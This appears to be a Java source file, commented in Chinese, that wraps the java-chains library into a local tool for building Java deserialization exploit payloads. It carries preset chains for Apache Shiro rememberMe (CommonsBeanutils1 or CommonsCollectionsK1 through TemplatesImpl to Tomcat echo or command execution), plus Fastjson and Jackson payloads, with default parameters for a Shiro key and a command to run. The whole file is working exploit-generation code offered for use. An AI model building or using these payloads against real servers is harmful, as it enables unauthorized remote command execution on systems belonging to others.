package shiro;

import org.vulhub.javachains.api.Gadget;
import org.vulhub.javachains.api.BuildResult;
import org.vulhub.javachains.api.GadgetContext;
import org.vulhub.javachains.common.GadgetParam;
import org.vulhub.javachains.core.ChainsRuntime;
import org.vulhub.javachains.core.ExecutionEngine;
import org.vulhub.javachains.core.GadgetFactory;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.TreeMap;

/**
 * java-chains 2.0.0-beta4 的封装层。
 *
 * <p>java-chains 是链式 payload 生成引擎：先选一个「payload 载体」（如 shiropayload、
 * javanativepayload、fastjsonpayload），再依次追加若干「gadget 节点」（如
 * commonscollectionsk1 → templatesimpl → bytecodeconvert → exec），
 * 引擎会按节点之间的 tag 约束校验链是否合法，最后产出 Base64 或字节数组形式的 payload。
 *
 * <p>本类只把它的能力暴露成适合本地工具调用的形式：初始化一次、查询节点与参数、构建 payload。
 * 所有生成动作都在本地内存中完成，不会发起任何网络请求。
 */
public final class ChainsEngine {

    /** 界面展示用的预置链模板。 */
    public static final class ChainTemplate {
        public final String name;
        public final String description;
        public final String payload;
        public final List<String> gadgets;

        public ChainTemplate(String name, String description, String payload, List<String> gadgets) {
            this.name = name;
            this.description = description;
            this.payload = payload;
            this.gadgets = Collections.unmodifiableList(new ArrayList<String>(gadgets));
        }
    }

    /** payload 构建结果。 */
    public static final class Generated {
        public boolean success;
        public String message = "";
        public String payload = "";
        public int byteLength;

        public static Generated fail(String message) {
            Generated generated = new Generated();
            generated.success = false;
            generated.message = message;
            return generated;
        }

        public static Generated ok(String payload) {
            Generated generated = new Generated();
            generated.success = true;
            generated.payload = payload == null ? "" : payload;
            generated.byteLength = generated.payload.length();
            generated.message = "payload 生成成功，长度 " + generated.byteLength + " 字符。";
            return generated;
        }
    }

    private static volatile boolean initialized;
    private static volatile String initMessage = "java-chains 尚未初始化。";

    private ChainsEngine() {
    }

    /**
     * 初始化引擎并加载全部节点。
     *
     * <p>java-chains 启动时需要访问 JDK 内部 xalan 实现（字节码 gadget 依赖），
     * Java 17 必须由启动参数开放：见项目 run.ps1 中的 --add-opens 设置。
     */
    public static synchronized void init() {
        if (initialized) return;
        try {
            ChainsRuntime.start();
            initialized = true;
            initMessage = "java-chains 已就绪，可用节点 " + GadgetFactory.getGadgetMap().size() + " 个。";
        } catch (Throwable error) {
            initialized = false;
            initMessage = "java-chains 初始化失败：" + describe(error)
                    + "。若为模块访问异常，请使用 run.ps1 启动（已包含 --add-opens 参数）。";
        }
    }

    public static boolean isReady() {
        return initialized;
    }

    public static String statusMessage() {
        return initMessage;
    }

    /** 全部节点 id（含 payload 与 gadget），按字母排序。 */
    public static List<String> nodeIds() {
        init();
        if (!initialized) return new ArrayList<String>();
        return new ArrayList<String>(new TreeMap<String, Class<? extends Gadget>>(GadgetFactory.getGadgetMap()).keySet());
    }

    /** 所有 payload 载体 id。 */
    public static List<String> payloadIds() {
        List<String> payloads = new ArrayList<String>();
        for (String id : nodeIds()) {
            if (id.toLowerCase(Locale.ROOT).endsWith("payload")) payloads.add(id);
        }
        return payloads;
    }

    /** 查询某个节点的可配置参数。 */
    public static List<GadgetParam> paramsOf(String nodeId) {
        init();
        if (!initialized || nodeId == null || nodeId.trim().isEmpty()) return new ArrayList<GadgetParam>();
        try {
            return ExecutionEngine.getParamsFromGadget(nodeId.trim());
        } catch (Throwable error) {
            return new ArrayList<GadgetParam>();
        }
    }

    /** 查询某个节点之后可以继续追加的节点 id。 */
    public static List<String> nextNodes(String nodeId) {
        init();
        List<String> result = new ArrayList<String>();
        if (!initialized || nodeId == null || nodeId.trim().isEmpty()) return result;
        try {
            org.vulhub.javachains.common.Result next = ExecutionEngine.getNextGadgets(nodeId.trim());
            if (next == null || !next.isSuccess() || next.getData() == null) return result;
            Object data = next.getData();
            if (data instanceof Iterable) {
                for (Object item : (Iterable<?>) data) {
                    String id = toNodeId(item);
                    if (!id.isEmpty() && !result.contains(id)) result.add(id);
                }
            }
            Collections.sort(result);
        } catch (Throwable ignored) {
            // 节点无后续时返回空列表
        }
        return result;
    }

    /** 把 Class 或字符串统一转成节点 id。 */
    private static String toNodeId(Object item) {
        if (item == null) return "";
        String simple;
        if (item instanceof Class) {
            simple = ((Class<?>) item).getSimpleName();
        } else {
            simple = String.valueOf(item);
            int dot = simple.lastIndexOf('.');
            if (dot >= 0) simple = simple.substring(dot + 1);
        }
        if (simple.isEmpty()) return "";
        // java-chains 注册节点时把类名整体小写（C3p0_C3p0Jndi -> c3p0_c3p0jndi），此处保持一致
        return simple.toLowerCase(Locale.ROOT);
    }

    /**
     * 构建 payload。
     *
     * @param payloadId payload 载体 id，例如 shiropayload
     * @param gadgets   依次追加的 gadget 节点 id
     * @param params    节点参数，键既支持完整形式（如 {@code Exec.cmd}）也支持字段名（如 {@code cmd}）
     */
    public static Generated build(String payloadId, List<String> gadgets, Map<String, Object> params) {
        init();
        if (!initialized) return Generated.fail(initMessage);
        if (payloadId == null || payloadId.trim().isEmpty()) return Generated.fail("请先选择 payload 类型。");
        try {
            Gadget payload = GadgetFactory.create(payloadId.trim());
            if (payload == null) return Generated.fail("找不到 payload：" + payloadId);
            ExecutionEngine engine = ExecutionEngine.create(payload);
            if (gadgets != null && !gadgets.isEmpty()) engine.addAll(new ArrayList<String>(gadgets));
            if (params != null && !params.isEmpty()) {
                engine.setAll(new LinkedHashMap<String, Object>(params));
            }
            BuildResult<?> result = engine.build(new GadgetContext());
            if (result == null) return Generated.fail("引擎没有返回构建结果。");
            if (!result.isSuccess()) {
                return Generated.fail(result.getMessage() == null ? "构建失败。" : result.getMessage());
            }
            Object data = result.getData();
            if (data instanceof byte[]) {
                return Generated.ok(ShiroEngine.base64((byte[]) data));
            }
            return Generated.ok(String.valueOf(data));
        } catch (Throwable error) {
            return Generated.fail(describe(error));
        }
    }

    /** 把参数名归一化：既接受 {@code Exec.cmd}，也接受 {@code cmd}。 */
    public static Map<String, Object> normalizeParams(Map<String, String> raw) {
        Map<String, Object> params = new LinkedHashMap<String, Object>();
        if (raw == null) return params;
        for (Map.Entry<String, String> entry : raw.entrySet()) {
            String key = entry.getKey() == null ? "" : entry.getKey().trim();
            if (key.isEmpty()) continue;
            String value = entry.getValue() == null ? "" : entry.getValue();
            params.put(key, value);
        }
        return params;
    }

    /** 内置预置链：覆盖 Shiro 场景下最常用的几条。 */
    public static List<ChainTemplate> templates() {
        List<ChainTemplate> templates = new ArrayList<ChainTemplate>();
        templates.add(new ChainTemplate("Shiro + CB1 回显",
                "CommonsBeanutils1 → TemplatesImpl → BytecodeConvert → TomcatEcho，命中后按请求头回显命令结果。",
                "shiropayload",
                java.util.Arrays.asList("commonsbeanutils1", "templatesimpl", "bytecodeconvert", "tomcatecho")));
        templates.add(new ChainTemplate("Shiro + CCK1 回显",
                "CommonsCollectionsK1 → TemplatesImpl → BytecodeConvert → TomcatEcho，适合 CC 依赖环境。",
                "shiropayload",
                java.util.Arrays.asList("commonscollectionsk1", "templatesimpl", "bytecodeconvert", "tomcatecho")));
        templates.add(new ChainTemplate("Shiro + CCK1 命令执行",
                "CommonsCollectionsK1 → TemplatesImpl → BytecodeConvert → Exec，直接执行单条命令。",
                "shiropayload",
                java.util.Arrays.asList("commonscollectionsk1", "templatesimpl", "bytecodeconvert", "exec")));
        templates.add(new ChainTemplate("Shiro 探测链",
                "CommonsCollectionsK1，仅验证密钥是否可解密（不执行任何代码）。",
                "shiropayload",
                Collections.singletonList("commonscollectionsk1")));
        templates.add(new ChainTemplate("Fastjson 回显",
                "fastjsonpayload → exec，生成 Fastjson 反序列化载荷。",
                "fastjsonpayload",
                Collections.singletonList("exec")));
        templates.add(new ChainTemplate("Jackson 回显",
                "javanativepayload → jackson 系节点，生成 Jackson 反序列化载荷。",
                "javanativepayload",
                Collections.singletonList("commonscollectionsk1")));
        return templates;
    }

    /** 生成常用参数模板：{@code Exec.cmd} 与 Shiro 密钥。 */
    public static Map<String, String> defaultParams(String payloadId, boolean gcm, String shiroKey, String command) {
        Map<String, String> params = new LinkedHashMap<String, String>();
        if ("shiropayload".equalsIgnoreCase(payloadId)) {
            params.put("ShiroPayload.shiroKey", shiroKey == null ? "" : shiroKey);
            params.put("ShiroPayload.gcmMode", String.valueOf(gcm));
            params.put("ShiroPayload.dirtyLength", "0");
        }
        if (command != null && !command.trim().isEmpty()) params.put("Exec.cmd", command.trim());
        return params;
    }

    /** 异常信息扁平化，便于界面直接展示。 */
    private static String describe(Throwable error) {
        Throwable cause = error;
        while (cause.getCause() != null && cause.getCause() != cause) cause = cause.getCause();
        String message = cause.getMessage();
        if (message == null || message.trim().isEmpty()) return cause.getClass().getSimpleName();
        return cause.getClass().getSimpleName() + ": " + message;
    }
}